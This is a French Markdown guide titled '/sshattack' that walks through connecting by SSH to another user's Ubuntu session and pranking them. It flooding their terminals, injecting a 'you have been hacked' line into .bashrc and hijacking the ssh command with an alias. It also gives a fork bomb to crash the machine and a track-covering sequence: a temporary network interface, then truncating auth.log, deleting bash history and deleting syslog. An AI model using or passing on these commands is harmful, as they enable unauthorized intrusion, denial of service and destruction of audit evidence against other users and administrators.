<link rel="stylesheet" type="text/css" href="/assets/css/red-theme.css">

# Ubuntu - Guide Pratique : /sshattack

Ce guide vous présente diverses commandes pour gérer les sessions SSH et quelques astuces pratiques.

---

## Création d'une Interface pour se Connecter en SSH

Ajoutez une nouvelle interface dans :

```
vim /etc/netplan/50-cloud-init.yaml
```

Pour forcer l'utilisation de cette interface lors de votre connexion en SSH :

```
ssh -b AdresseIP
```

---

## Connexion en SSH à une Session

Pour vous connecter à un compte SSH, utilisez la commande suivante :

```
ssh -Y user@hostname
```
- **`user`** : nom d'utilisateur du compte distant.
- **`hostname`** : adresse IP.
- **`-Y`** : pour avoir plus de permissions.

---

## Accès aux Sessions Utilisateurs

### Passer en Mode Super Utilisateur (Root)

Pour obtenir des droits d'administration :

```
sudo -i
```

### Passer à la Session d’un Autre Utilisateur

Pour accéder à la session d'un utilisateur spécifique :

```
su - username
```
- **`username`** : nom d'utilisateur de la personne à laquelle vous souhaitez accéder.

---

## Ouvrir un Terminal à Distance

Si vous avez réussi à vous connecter directement sur la session de l'utilisateur actuellement connecté, vous pouvez ouvrir un terminal à distance avec la commande suivante :

```
gnome-terminal
```
si ca marche, ce script permet d'ouvrir en boucle plusieurs terminaux en affichant un texte :

```
for i in {1..10}; do gnome-terminal -- bash -c "sleep 0.2; echo 'TON_TEXTE'; exec bash"; sleep 0.2; done
```

---

## Envoyer un Message à un Terminal Actif

Pour envoyer un message à un terminal ouvert :

```
echo "TEXTE" > /dev/pts/0
```
- Remplacez **`TEXTE`** par votre message.
- **`pts/0`** : représente le numéro du terminal (utilisez `who` pour vérifier le numéro).

## Envoyer une Notification

À faire quand vous êtes sur la session :

```
notify-send "texte"
```


---

## Message à Chaque Ouverture de Terminal

### Ajouter un Message de Troll

Modifiez le fichier `.bashrc` pour exécuter une commande à chaque ouverture de terminal :

```
echo "echo 'Vous avez été piraté !'" >> /home/username/.bashrc
```

---

## ⚠️ Ajouter des Alias à des Commandes (à remettre par défaut)

### Exemple d'Aliasing pour SSH

Pour rediriger une commande SSH vers un autre utilisateur :

1. Ouvrez le fichier `.bashrc` :

```
vim /home/user/.bashrc
```

2. Ajoutez l'alias à la fin du fichier :

```
alias ssh='ssh sio@192.168.1.1'
```

### Recharger le Fichier .bashrc

Pour appliquer les modifications :

```
source /home/user/.bashrc
```

---

## ⚠️ Faire crash un PC (À utiliser avec précaution) :

```
:(){ :|:& };:
```

## Autres Trolls Visuels

### Afficher un Train

Installez le paquet `sl` pour afficher un train dans le terminal :

```
apt install sl
```

Pour exécuter le train sur le terminal d'un autre utilisateur :

```
sl > /dev/pts/0
```

### Cowsay

Installez `cowsay` pour afficher un message avec une vache parlante :

```
apt install cowsay
```

Pour afficher "Meuuuh" :

```
echo "Meuuuh" | cowsay > /dev/pts/0
```

### Effet Matrix

Installez `cmatrix` pour l'effet :

```
apt install cmatrix
```

Pour exécuter l'effet :

```
cmatrix > /dev/pts/0
```

### Message Toilette

Installez `toilet` pour formater le texte :

```
apt install toilet
```

Pour envoyer un message "GAYPRIDE" :

```
echo "GAYPRIDE" | toilet --gay > /dev/pts/0
```

### Simulation d'Aquarium

Installez `asciiquarium` pour afficher un aquarium animé :

```
sudo snap install asciiquarium
```

Pour exécuter l'aquarium :

```
asciiquarium > /dev/pts/0
```

---

## Gestion des Fichiers de Log

### Vider le Fichier `auth.log`

Pour vider le contenu du fichier de log d'authentification :

```
sudo truncate -s 0 /var/log/auth.log
```

### Effacer l'Historique des Commandes Bash

#### Effacer l'Historique de la Session

Pour supprimer le fichier d'historique :

```
rm /home/user/.bash_history
```

#### Vider l'Historique en Mémoire

Pour vider l'historique des commandes en mémoire :

```
history -c
```

---

## Déconnexion

Pour vous déconnecter de la session SSH :

```
exit
```

---

## Supprimer l'Interface que Vous Avez Créée pour la Connexion

Avant de supprimer, vérifiez si votre nouvelle IP est bien dans les logs :

```
grep -i 'ADDRESSE_IP' /var/log/syslog
```

Pour supprimer l'interface que nous avons créée :

```
vim /etc/netplan/50-cloud-init.yaml
```

(Puis, supprimez l'interface manuellement).

---

## Redémarrer le Service Réseau

N'oubliez pas de redémarrer votre service réseau :

```
sudo netplan apply
```

---

## Supprimer Maintenant le Fichier de Log

```
sudo rm /var/log/syslog
```

---

### **[↩️ Retour](index.md)**